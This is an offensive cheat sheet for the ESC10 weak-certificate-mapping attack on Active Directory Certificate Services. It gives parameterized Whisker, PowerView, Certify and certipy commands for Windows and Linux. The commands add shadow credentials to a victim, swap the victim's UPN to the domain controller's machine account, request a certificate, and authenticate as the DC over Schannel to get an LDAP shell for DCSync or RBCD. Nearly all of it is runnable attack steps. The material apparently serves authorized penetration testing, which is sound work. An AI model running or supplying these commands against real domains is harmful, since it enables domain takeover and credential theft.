---
technique: ESC10 - Weak Certificate Mapping
category: adcs
targets: Certificate Authority, Certificate Templates, Domain Principals
protocols: LDAP, RPC, HTTP, Kerberos
remote_capable: true
tags: adcs esc esc10 certificate-services pkinit
---

# ESC10 - Weak Certificate Mapping

ESC10 abuses weak certificate mapping enforcement, often by rewriting a victim UPN to a target machine or user principal.

## Windows

### ESC10: Step 1: add shadow credentials to victim (Whisker)

#powershell #whisker #shadow-credentials

Add shadow credentials to the victim account to authenticate as them later.

```powershell title:"ESC10: add shadow credentials to victim via Whisker"
.\Whisker.exe add /target:"$victim_user" /domain:"$domain" /dc:"$dc_name" /path:"shadow.pfx" /password:"$pfx_pass"
```
<!-- cheat
import domain_ip
import users
var victim_user
var dc_name
var pfx_pass
-->

### ESC10: Step 2: rewrite victim UPN to DC machine account (PowerView)

#powershell #powerview #weak-mapping #upn-swap

Rewrite the victim's UPN to the DC machine account UPN to abuse weak certificate binding enforcement.

```powershell title:"ESC10: set victim UPN to DC machine account"
Set-DomainObject "$victim_user" -Set @{'userPrincipalName'='$dc_name$@$domain'} -Verbose
```
<!-- cheat
import domain_ip
import users
var victim_user
var dc_name
-->

### ESC10: Step 3: request User cert as victim (Certify)

#powershell #certify #weak-mapping #schannel

Request a cert from the User template while the victim's UPN maps to the DC machine account.

```powershell title:"ESC10: request User cert while victim UPN is DC machine account"
.\Certify.exe request /ca:"$domain\$ca_name" /template:"User"
```
<!-- cheat
import domain_ip
import users
var ca_name
-->

### ESC10: Step 4: restore victim UPN (PowerView)

#powershell #powerview #weak-mapping

Restore the victim's original UPN.

```powershell title:"ESC10: restore victim UPN to original value"
Set-DomainObject "$victim_user" -Set @{'userPrincipalName'='$victim_user@$domain'} -Verbose
```
<!-- cheat
import domain_ip
import users
var victim_user
-->

## Linux

### ESC10: Step 1: obtain victim NT hash via shadow credentials (certipy)

#certipy #shadow-credentials #weak-mapping

Get the victim's NT hash via shadow credentials.

```sh title:"ESC10: shadow auto to get victim NT hash"
certipy shadow auto -u $user@$domain $auth_flags -dc-ip $rhost_ip -account $victim_user
```
<!-- cheat
import domain_ip
import users
import certipy_auth
var victim_user
-->

### ESC10: Step 2: rewrite victim UPN to DC machine account (certipy)

#certipy #weak-mapping #upn-swap

Rewrite the victim's UPN to the DC machine account UPN.

```sh title:"ESC10: update victim UPN to DC machine account"
certipy account -u $user@$domain $auth_flags -dc-ip $rhost_ip -upn "$dc_name\$@$domain" -user $victim_user update
```
<!-- cheat
import domain_ip
import users
import certipy_auth
var victim_user
var dc_name
-->

### ESC10: Step 3: request User cert as victim (certipy)

#certipy #weak-mapping #schannel

Request a User template cert using the victim's Kerberos ticket while UPN maps to the DC.

```sh title:"ESC10: request User cert while victim UPN is DC machine account"
certipy req -k -dc-ip $rhost_ip -target $ca_fqdn -ca $ca_name -template User
```
<!-- cheat
import domain_ip
var ca_fqdn
var ca_name
-->

### ESC10: Step 4: restore victim UPN (certipy)

#certipy #weak-mapping #upn-swap

Restore the victim's original UPN.

```sh title:"ESC10: restore victim UPN"
certipy account -u $user@$domain $auth_flags -dc-ip $rhost_ip -upn $victim_user@$domain -user $victim_user update
```
<!-- cheat
import domain_ip
import users
import certipy_auth
var victim_user
-->

### ESC10: Step 5: authenticate via Schannel LDAP shell (certipy)

#certipy #schannel #ldap-shell

Authenticate using the DC cert via Schannel to get an LDAP shell for RBCD or DCSync.

```sh title:"ESC10: Schannel auth with DC cert for LDAP shell"
certipy auth -pfx $dc_name.pfx -dc-ip $rhost_ip -ldap-shell
```
<!-- cheat
import domain_ip
import certipy_auth
var dc_name
-->
